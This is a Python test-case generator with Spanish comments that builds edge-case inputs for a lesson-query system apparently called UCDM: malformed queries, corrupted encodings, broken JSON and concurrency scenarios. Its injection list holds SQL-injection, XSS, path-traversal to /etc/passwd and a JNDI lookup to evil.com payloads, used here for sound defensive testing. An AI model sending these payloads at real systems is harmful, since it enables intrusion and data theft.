#!/usr/bin/env python3
"""
Edge Case Generator - Generador de casos límite para testing exhaustivo
Crea escenarios extremos para validar robustez del sistema UCDM
"""

import random
import string
import json
import logging
from typing import List, Dict, Any, Tuple, Optional, Generator
from datetime import datetime, timedelta
from dataclasses import dataclass
import tempfile
import os

@dataclass
class EdgeCase:
    """Caso edge definido"""
    name: str
    category: str
    input_data: Any
    expected_behavior: str
    severity: str  # 'low', 'medium', 'high', 'critical'
    description: str

class EdgeCaseGenerator:
    """
    Generador de casos edge para testing exhaustivo del sistema UCDM
    
    Categorías de casos edge:
    - Entrada malformada (queries inválidas, caracteres especiales)
    - Límites de sistema (memoria, tamaño, concurrencia)
    - Datos corruptos (JSON inválido, encoding)
    - Estados inconsistentes (índices parciales, archivos faltantes)
    - Concurrencia (acceso simultáneo, condiciones de carrera)
    """
    
    def __init__(self, seed: Optional[int] = None):
        """
        Inicializar generador
        
        Args:
            seed: Semilla para reproducibilidad
        """
        if seed:
            random.seed(seed)
        
        self.logger = self._setup_logging()
        
        # Configuración de casos edge
        self._corrupted_chars = ['À', 'â', 'ñ', '中', '🔥', '\x00', '\uffff']
        self._large_sizes = [1024, 10240, 102400, 1048576]  # 1KB, 10KB, 100KB, 1MB
        self._encoding_issues = ['latin-1', 'cp1252', 'ascii']
        
        self.logger.info("Edge Case Generator inicializado")
    
    def _setup_logging(self) -> logging.Logger:
        """Configurar logging"""
        logger = logging.getLogger(f"{__name__}.EdgeCaseGenerator")
        logger.setLevel(logging.INFO)
        
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        
        return logger
    
    def generate_malformed_queries(self, count: int = 50) -> List[EdgeCase]:
        """Generar consultas malformadas"""
        cases = []
        
        # Consultas vacías y solo espacios
        cases.extend([
            EdgeCase(
                name="empty_query",
                category="malformed_input",
                input_data="",
                expected_behavior="graceful_error_handling",
                severity="medium",
                description="Consulta completamente vacía"
            ),
            EdgeCase(
                name="whitespace_only_query",
                category="malformed_input", 
                input_data="   \t\n   ",
                expected_behavior="graceful_error_handling",
                severity="medium",
                description="Solo espacios en blanco y tabs"
            )
        ])
        
        # Consultas extremadamente largas
        for i, size in enumerate(self._large_sizes):
            cases.append(EdgeCase(
                name=f"oversized_query_{i}",
                category="malformed_input",
                input_data="¿" + "a" * size + "?",
                expected_behavior="size_limit_enforcement",
                severity="high" if size > 10240 else "medium",
                description=f"Consulta de {size} caracteres"
            ))
        
        # Caracteres especiales y corrupción de encoding
        for i, char in enumerate(self._corrupted_chars):
            cases.append(EdgeCase(
                name=f"corrupted_encoding_{i}",
                category="malformed_input",
                input_data=f"Lección {char * 10} sobre amor",
                expected_behavior="encoding_error_handling",
                severity="medium",
                description=f"Caracteres corruptos: {repr(char)}"
            ))
        
        # Inyección de código y caracteres de control
        injection_attempts = [
            "'; DROP TABLE lessons; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02\x03\x04",
            "\\u0000\\u0001\\u0002"
        ]
        
        for i, injection in enumerate(injection_attempts):
            cases.append(EdgeCase(
                name=f"injection_attempt_{i}",
                category="security",
                input_data=f"Explícame la lección {injection}",
                expected_behavior="sanitization_and_safe_handling",
                severity="critical",
                description=f"Intento de inyección: {injection[:20]}..."
            ))
        
        # Consultas con estructura JSON inválida  
        json_malformed = [
            '{"query": "test"',  # JSON incompleto
            '{"query": "test",}',  # Coma extra
            '{"query": test}',  # Sin comillas
            '{query: "test"}',  # Claves sin comillas
            '{"query": "te"st"}' # Comillas dentro de string
        ]
        
        for i, malformed_json in enumerate(json_malformed):
            cases.append(EdgeCase(
                name=f"malformed_json_{i}",
                category="malformed_input",
                input_data=malformed_json,
                expected_behavior="json_parsing_error_handling",
                severity="medium",
                description=f"JSON malformado: {malformed_json}"
            ))
        
        # Números de lección inválidos
        invalid_lessons = [-1, 0, 366, 999, 1.5, "abc", None, float('inf')]
        
        for i, invalid in enumerate(invalid_lessons):
            cases.append(EdgeCase(
                name=f"invalid_lesson_number_{i}",
                category="boundary_conditions",
                input_data=f"Lección {invalid}",
                expected_behavior="range_validation_error",
                severity="medium",
                description=f"Número de lección inválido: {invalid}"
            ))
        
        return cases[:count]
    
    def generate_resource_limit_cases(self, count: int = 20) -> List[EdgeCase]:
        """Generar casos de límites de recursos"""
        cases = []
        
        # Memoria limitada - simulación de contenido masivo
        for i, multiplier in enumerate([10, 100, 1000]):
            massive_content = {
                "lesson_details": {
                    str(j): {
                        "title": f"Lección {j} " + "contenido muy largo " * multiplier,
                        "content": "a" * (1024 * multiplier),
                        "concepts": ["concepto"] * multiplier
                    } for j in range(1, min(366, multiplier))
                }
            }
            
            cases.append(EdgeCase(
                name=f"memory_stress_{i}",
                category="resource_limits",
                input_data=massive_content,
                expected_behavior="memory_management_graceful_degradation",
                severity="high" if multiplier >= 100 else "medium",
                description=f"Contenido masivo {multiplier}x normal"
            ))
        
        # Archivos temporales para simular corrupción de disco
        for i in range(3):
            cases.append(EdgeCase(
                name=f"disk_corruption_{i}",
                category="resource_limits",
                input_data=self._create_corrupted_temp_file(i),
                expected_behavior="file_corruption_recovery",
                severity="high",
                description=f"Archivo corrompido tipo {i}"
            ))
        
        # Concurrencia extrema
        for i, concurrent_users in enumerate([50, 100, 200]):
            cases.append(EdgeCase(
                name=f"high_concurrency_{i}",
                category="concurrency",
                input_data={"concurrent_requests": concurrent_users, "duration_seconds": 30},
                expected_behavior="concurrent_access_stability",
                severity="critical" if concurrent_users >= 200 else "high",
                description=f"{concurrent_users} usuarios concurrentes"
            ))
        
        return cases[:count]
    
    def generate_data_corruption_cases(self, count: int = 15) -> List[EdgeCase]:
        """Generar casos de corrupción de datos"""
        cases = []
        
        # JSON parcialmente válido pero con datos inconsistentes
        inconsistent_data_samples = [
            {
                "lesson_details": {"1": {"title": "Lección 1"}},  # Sin content
                "concept_index": {"amor": [999]},  # Lección inexistente
                "date_mapping": {"01-01": "invalid"}  # Mapeo inválido
            },
            {
                "lesson_details": {},  # Vacío
                "concept_index": None,  # Null
                "date_mapping": {"13-40": 1}  # Fecha inválida
            },
            {
                "lesson_details": {"1": None},  # Lección null
                "concept_index": {"": ["1", "2"]},  # Concepto vacío
                "date_mapping": {"01-01": [1, 2]}  # Múltiples lecciones por día
            }
        ]
        
        for i, data in enumerate(inconsistent_data_samples):
            cases.append(EdgeCase(
                name=f"inconsistent_data_{i}",
                category="data_corruption",
                input_data=data,
                expected_behavior="data_validation_and_recovery",
                severity="high",
                description=f"Datos inconsistentes tipo {i}"
            ))
        
        # Encoding corrupto simulado
        encoding_corruption = [
            "Lecci\xf3n 1 sobre el am\xf3r",  # Latin-1 en UTF-8
            "Lección\x00\x001\x00sobre\x00amor",  # Null bytes
            "Lecci\udcddn 1",  # Surrogates inválidos
        ]
        
        for i, corrupted_text in enumerate(encoding_corruption):
            cases.append(EdgeCase(
                name=f"encoding_corruption_{i}",
                category="data_corruption",
                input_data=corrupted_text,
                expected_behavior="encoding_error_recovery",
                severity="medium",
                description=f"Corrupción encoding tipo {i}"
            ))
        
        # Estructuras de archivo JSON corruptas
        json_corruption_samples = [
            '{"lesson_details": {"1": {"title": "Test"',  # JSON truncado
            '{"lesson_details": NaN}',  # Valores JavaScript inválidos
            '{"lesson_details": undefined}',
            '{"lesson_details": +Infinity}',
        ]
        
        for i, corrupted_json in enumerate(json_corruption_samples):
            cases.append(EdgeCase(
                name=f"json_corruption_{i}",
                category="data_corruption",
                input_data=corrupted_json,
                expected_behavior="json_corruption_detection_and_recovery",
                severity="high",
                description=f"JSON corrompido: {corrupted_json[:30]}..."
            ))
        
        return cases[:count]
    
    def generate_concurrency_cases(self, count: int = 10) -> List[EdgeCase]:
        """Generar casos de concurrencia y condiciones de carrera"""
        cases = []
        
        # Acceso simultáneo a recursos compartidos
        shared_resource_scenarios = [
            {
                "scenario": "simultaneous_cache_access",
                "operations": ["read_cache", "write_cache", "invalidate_cache"],
                "threads": 10,
                "duration": 5
            },
            {
                "scenario": "concurrent_index_loading",
                "operations": ["load_index", "reload_index", "access_index"],
                "threads": 20,
                "duration": 10
            },
            {
                "scenario": "parallel_response_generation",
                "operations": ["generate_response", "cache_response", "validate_response"],
                "threads": 15,
                "duration": 8
            }
        ]
        
        for i, scenario in enumerate(shared_resource_scenarios):
            cases.append(EdgeCase(
                name=f"concurrency_{scenario['scenario']}",
                category="concurrency",
                input_data=scenario,
                expected_behavior="thread_safe_operations_no_corruption",
                severity="critical",
                description=f"Concurrencia en {scenario['scenario']}"
            ))
        
        # Condiciones de carrera específicas
        race_conditions = [
            {
                "name": "cache_write_read_race",
                "description": "Lectura durante escritura de cache",
                "operations": ["start_write", "concurrent_read", "finish_write"]
            },
            {
                "name": "index_reload_access_race", 
                "description": "Acceso durante recarga de índice",
                "operations": ["start_reload", "concurrent_access", "finish_reload"]
            }
        ]
        
        for race in race_conditions:
            cases.append(EdgeCase(
                name=race["name"],
                category="race_conditions",
                input_data=race,
                expected_behavior="race_condition_safe_handling",
                severity="critical",
                description=race["description"]
            ))
        
        return cases[:count]
    
    def _create_corrupted_temp_file(self, corruption_type: int) -> str:
        """Crear archivo temporal con diferentes tipos de corrupción"""
        temp_file = tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.json')
        
        try:
            if corruption_type == 0:
                # Archivo truncado
                temp_file.write(b'{"lesson_details": {"1": {"title": "Test"')
            elif corruption_type == 1:
                # Bytes aleatorios
                temp_file.write(os.urandom(1024))
            else:
                # JSON con null bytes
                temp_file.write(b'{"lesson_details": \x00\x00\x00}')
            
            temp_file.flush()
            return temp_file.name
        
        finally:
            temp_file.close()
    
    def generate_comprehensive_test_suite(self) -> List[EdgeCase]:
        """Generar suite completa de casos edge"""
        all_cases = []
        
        self.logger.info("Generando suite completa de casos edge...")
        
        # Generar todos los tipos de casos
        all_cases.extend(self.generate_malformed_queries(50))
        all_cases.extend(self.generate_resource_limit_cases(20))
        all_cases.extend(self.generate_data_corruption_cases(15))
        all_cases.extend(self.generate_concurrency_cases(10))
        
        # Casos específicos del dominio UCDM
        ucdm_specific_cases = self._generate_ucdm_specific_cases()
        all_cases.extend(ucdm_specific_cases)
        
        self.logger.info(f"Suite generada: {len(all_cases)} casos edge")
        
        return all_cases
    
    def _generate_ucdm_specific_cases(self) -> List[EdgeCase]:
        """Generar casos específicos del dominio UCDM"""
        cases = []
        
        # Casos específicos de lecciones UCDM
        ucdm_edge_cases = [
            EdgeCase(
                name="invalid_lesson_date",
                category="ucdm_domain",
                input_data="Lección para el 30 de febrero",
                expected_behavior="date_validation_error",
                severity="medium",
                description="Fecha inexistente en calendario"
            ),
            EdgeCase(
                name="concept_not_in_course",
                category="ucdm_domain", 
                input_data="Explícame sobre la venganza en UCDM",
                expected_behavior="concept_not_found_graceful_response",
                severity="low",
                description="Concepto que no existe en el curso"
            ),
            EdgeCase(
                name="mixed_language_query",
                category="ucdm_domain",
                input_data="What is the lección número 五 about perdón?",
                expected_behavior="language_detection_and_processing",
                severity="medium",
                description="Consulta en múltiples idiomas"
            ),
            EdgeCase(
                name="lesson_structure_violation",
                category="ucdm_domain",
                input_data={
                    "query": "Lección 1",
                    "force_structure": False  # Forzar violación de estructura
                },
                expected_behavior="structure_enforcement",
                severity="high",
                description="Intento de violar estructura de respuesta"
            )
        ]
        
        cases.extend(ucdm_edge_cases)
        return cases
    
    def export_test_cases(self, cases: List[EdgeCase], filename: str = "edge_cases.json"):
        """Exportar casos edge a archivo JSON"""
        try:
            export_data = {
                "generated_at": datetime.now().isoformat(),
                "total_cases": len(cases),
                "categories": list(set(case.category for case in cases)),
                "cases": [
                    {
                        "name": case.name,
                        "category": case.category,
                        "input_data": case.input_data,
                        "expected_behavior": case.expected_behavior,
                        "severity": case.severity,
                        "description": case.description
                    }
                    for case in cases
                ]
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False, default=str)
            
            self.logger.info(f"Casos edge exportados a {filename}")
            
        except Exception as e:
            self.logger.error(f"Error exportando casos edge: {e}")
    
    def get_statistics(self, cases: List[EdgeCase]) -> Dict[str, Any]:
        """Obtener estadísticas de los casos edge generados"""
        if not cases:
            return {"error": "No hay casos edge para analizar"}
        
        # Agrupar por categoría
        by_category = {}
        for case in cases:
            if case.category not in by_category:
                by_category[case.category] = []
            by_category[case.category].append(case)
        
        # Agrupar por severidad
        by_severity = {}
        for case in cases:
            if case.severity not in by_severity:
                by_severity[case.severity] = []
            by_severity[case.severity].append(case)
        
        return {
            "total_cases": len(cases),
            "categories": {
                category: len(cases_list) 
                for category, cases_list in by_category.items()
            },
            "severity_distribution": {
                severity: len(cases_list)
                for severity, cases_list in by_severity.items()
            },
            "most_critical_category": max(by_category.items(), key=lambda x: len(x[1]))[0],
            "coverage_areas": list(by_category.keys())
        }


def create_edge_case_generator(seed: Optional[int] = None) -> EdgeCaseGenerator:
    """Crear instancia de EdgeCaseGenerator"""
    return EdgeCaseGenerator(seed=seed)